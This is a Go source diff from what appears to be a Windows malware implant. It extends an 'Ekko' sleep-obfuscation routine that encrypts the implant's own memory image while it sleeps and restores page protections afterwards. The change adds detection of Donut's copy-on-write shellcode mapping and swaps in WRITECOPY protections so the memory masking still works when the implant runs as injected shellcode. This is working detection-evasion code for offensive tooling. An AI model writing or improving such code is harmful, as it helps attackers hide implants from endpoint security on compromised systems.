@@ -55,13 +55,14 @@ var (
 var (
 	implantBase, implantSize uintptr
 	implantErr               error
+	implantMapped            bool   // Donut maps shellcode as a copy-on-write view
 	mainTID                  uint32 // Go runs package init on its main thread
 )
 
 func init() {
 	mainTID = windows.GetCurrentThreadId()
 	// mainTID is a global, so its address is inside the implant image wherever it was loaded.
-	implantBase, implantSize, implantErr = implantImage(uintptr(unsafe.Pointer(&mainTID)))
+	implantBase, implantSize, implantMapped, implantErr = implantImage(uintptr(unsafe.Pointer(&mainTID)))
 }
 
 func EkkoSleep(sleepTime uint64) error {
@@ -228,13 +229,13 @@ func ekko(sleepTime uint64, peers []windows.Handle) error {
 	for _, h := range peers {
 		queue(step(CtxThread, procGetThreadContext.Addr(), uint64(h), pScratch), 3)
 	}
-	queue(step(CtxThread, procVirtualProtect.Addr(), imgBase, imgSize, windows.PAGE_READWRITE, pOld), 4)
+	queue(step(CtxThread, procVirtualProtect.Addr(), imgBase, imgSize, uint64(writable(windows.PAGE_READWRITE)), pOld), 4)
 	queue(step(CtxThread, procSystemFunction032.Addr(), pImg, pKey), 5)        // encrypt
 	queue(step(CtxThread, procWaitForSingleObject.Addr(), self, sleepTime), 6) // sleep
 	queue(step(CtxThread, procSystemFunction032.Addr(), pImg, pKey), 7)        // decrypt
 	// put every region back as it was; order inside the phase doesn't matter
 	for _, r := range regions {
-		queue(step(CtxThread, procVirtualProtect.Addr(), uint64(r.base), uint64(r.size), uint64(r.prot), pOld), 8)
+		queue(step(CtxThread, procVirtualProtect.Addr(), uint64(r.base), uint64(r.size), uint64(writable(r.prot)), pOld), 8)
 	}
 	queue(step(CtxThread, procNtResumeProcess.Addr(), self), 9)
 	queue(step(CtxThread, procSetEvent.Addr(), uint64(hEvent)), 10)
@@ -286,15 +287,35 @@ func imageRegions(imageBase, imageSize uintptr) ([]region, error) {
 // implantImage returns the memory allocation that contains addr: the module
 // for an EXE, or the buffer Donut mapped the implant into. It walks regions
 // while they belong to the same allocation, so it needs no PE headers.
-func implantImage(addr uintptr) (base, size uintptr, err error) {
+func implantImage(addr uintptr) (base, size uintptr, mapped bool, err error) {
 	var mbi windows.MemoryBasicInformation
 	if err = windows.VirtualQuery(addr, &mbi, unsafe.Sizeof(mbi)); err != nil {
-		return 0, 0, err
+		return 0, 0, false, err
 	}
-	base = mbi.AllocationBase
+	base, mapped = mbi.AllocationBase, mbi.Type == memMapped
 	end := base
 	for windows.VirtualQuery(end, &mbi, unsafe.Sizeof(mbi)) == nil && mbi.AllocationBase == base {
 		end += mbi.RegionSize
 	}
-	return base, end - base, nil
+	return base, end - base, mapped, nil
+}
+
+const memMapped = 0x40000 // MEM_MAPPED; x/sys/windows doesn't define it
+
+// writable adjusts a protection for the implant's memory type. A copy-on-write
+// view, which is how Donut maps shellcode, rejects PAGE_READWRITE ("The
+// parameter is incorrect") but accepts PAGE_WRITECOPY, which gives the same
+// result: each page becomes a private, writable copy. EXE images and private
+// memory keep the protection as given.
+func writable(prot uint32) uint32 {
+	if !implantMapped {
+		return prot
+	}
+	switch prot {
+	case windows.PAGE_READWRITE:
+		return windows.PAGE_WRITECOPY
+	case windows.PAGE_EXECUTE_READWRITE:
+		return windows.PAGE_EXECUTE_WRITECOPY
+	}
+	return prot
 }
